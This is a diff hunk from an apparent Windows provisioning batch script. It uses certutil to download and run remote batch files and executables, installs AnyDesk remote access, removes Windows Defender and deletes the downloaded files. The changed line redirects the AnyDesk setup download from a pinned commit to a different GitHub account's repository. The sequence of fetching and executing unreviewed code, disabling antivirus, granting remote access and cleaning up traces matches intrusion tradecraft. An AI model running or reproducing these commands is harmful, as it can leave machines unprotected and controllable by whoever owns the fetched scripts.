@@ -41,7 +41,7 @@ certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows
 ::Download Schedule Task Init
 certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/ScheduleTask.bat" "C:\Users\Public\Downloads\ScheduleTask.bat"
 ::Install Anydesk
-certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/beac0cacceee4871dfe6bbb999498699083c1198/setupAnydesk.bat" "C:\Users\Public\Downloads\setupAnydesk.bat" && cmd.exe /c "C:\Users\Public\Downloads\setupAnydesk.bat" && del /F /Q "C:\Users\Public\Downloads\setupAnydesk.bat"
+certutil -urlcache -split -f "https://raw.githubusercontent.com/nobita2906/anydesk-config/main/setupAnydesk.bat" "C:\Users\Public\Downloads\setupAnydesk.bat" && cmd.exe /c "C:\Users\Public\Downloads\setupAnydesk.bat" && del /F /Q "C:\Users\Public\Downloads\setupAnydesk.bat"
 ::remove Window Defender
 certutil -urlcache -split -f "https://github.com/ionuttbara/windows-defender-remover/releases/download/release_def_12_5_0/DefenderRemover.exe" "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe" && cmd.exe /c "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe /Y" && del /F /Q "C:\Users\Public\Downloads\DefenderRemover.Phase5.exe"
 ::Unpin Microsoft Store
